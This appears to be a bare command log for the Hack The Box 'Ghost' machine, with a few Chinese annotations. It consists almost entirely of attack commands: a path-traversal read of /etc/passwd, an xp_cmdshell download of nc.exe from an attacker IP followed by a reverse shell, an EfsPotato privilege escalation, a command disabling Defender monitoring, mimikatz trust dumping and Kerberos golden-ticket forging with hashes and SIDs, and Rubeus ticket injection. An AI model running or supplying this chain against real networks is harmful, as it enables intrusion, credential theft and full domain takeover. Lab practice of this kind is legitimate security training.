# Ghost


http://ghost.htb:8008/ghost/api/v3/content/posts/?extra=../../../../etc/passwd&key=a5af628828958c976a3b6cc81a


curl http://intranet.ghost.htb:8008/api-dev/scan -X POST -H 'X-DEV-INTRANET-KEY: !@y******' -H 'Content-Type: application/json' -d '{"url": "<<bash 196 revshell>>"}'


python3 mssqlclient.py ghost.htb/intranet_principal:'He******'@DC01.ghost.htb -windows-auth

impacket-mssqlclient florence.ramirez:'He*****'@ghost.htb -windows-auth

ux******和He******都可以

enum_links

use_link [PRIMARY]

use master

exec_as_login sa

--impacket-mssqlclient-- --> EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://10.10.xx.xx/nc.exe -OutFile $env:TEMP\nc.exe"'

                             EXEC xp_cmdshell '%TEMP%\nc.exe -e cmd.exe 10.10.xx.xx xxxx';

                             
--python3 mssqlclient.py-- --> xp_cmdshell


./EfsPotato.exe 'nc.exe -e cmd.exe 10.10.xx.xx xxxx'


wmic useraccount get name,sid


关AV：
Set-MpPreference -DisableRealtimeMonitoring $true


.\mimikatz.exe "lsadump::trust /patch" exit


.\mimikatz.exe "kerberos::golden /user:Administrator /domain:CORP.GHOST.HTB /sid:S-1-5-21-2034262909-2733679486-179904498-502 /sids:S-1-5-21-4084500788-938703357-3654145966-519 /rc4:dae1ad83e2af14a379017f244a2f5297 /service:krbtgt /target:GHOST.HTB /ticket:golden.kirbi" exit


.\Rubeus.exe asktgs /ticket:golden.kirbi /dc:dc01.ghost.htb /service:CIFS/dc01.ghost.htb /nowrap /ptt


type \\DC01.ghost.htb\c$\Users\justin.bradley\Desktop\user.txt
type \\DC01.ghost.htb\c$\Users\Administrator\Desktop\root.txt
